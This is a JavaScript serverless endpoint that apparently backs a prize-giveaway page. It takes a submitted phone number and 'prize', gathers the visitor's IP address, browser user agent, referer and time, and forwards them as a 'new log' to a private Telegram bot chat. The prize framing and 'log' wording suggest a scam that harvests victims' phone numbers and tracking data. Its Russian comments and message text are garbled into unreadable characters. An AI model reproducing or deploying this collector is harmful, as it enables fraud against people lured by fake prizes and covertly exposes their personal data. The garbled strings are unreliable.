export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const { phone, prize } = req.body;

    // –í—Ä–µ–º—è (–ø–æ UTC, –º–æ–∂–Ω–æ –ø–æ—Ç–æ–º —Å–¥–≤–∏–Ω—É—Ç—å –ø–æ–¥ —Å–≤–æ–π —á–∞—Å–æ–≤–æ–π –ø–æ—è—Å)
    const now = new Date();
    const time = now.toLocaleString("ru-RU", { timeZone: "Asia/Almaty" });

    // IP (–∏–∑ –∑–∞–≥–æ–ª–æ–≤–∫–∞)
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // User-Agent (–±—Ä–∞—É–∑–µ—Ä/—É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ)
    const ua = req.headers["user-agent"] || "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";

    // Referer (–æ—Ç–∫—É–¥–∞ –ø—Ä–∏—à—ë–ª —á–µ–ª–æ–≤–µ–∫)
    const referer = req.headers["referer"] || "–ø—Ä—è–º–æ–π –∑–∞—Ö–æ–¥";

    // –°–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
    const text = `
‚úÖ –ù–æ–≤—ã–π –ª–æ–≥
üìû –ù–æ–º–µ—Ä: ${phone}
üéÅ –ü—Ä–∏–∑: ${prize}
‚è∞ –í—Ä–µ–º—è: ${time}
üåç IP: ${ip}
üñ•Ô∏è –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${ua}
üîó –ò—Å—Ç–æ—á–Ω–∏–∫: ${referer}
    `;

    // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
    await fetch(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text,
          parse_mode: "HTML",
        }),
      }
    );

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error("–û—à–∏–±–∫–∞ –≤ –ª–æ–≥–∞—Ö:", err);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
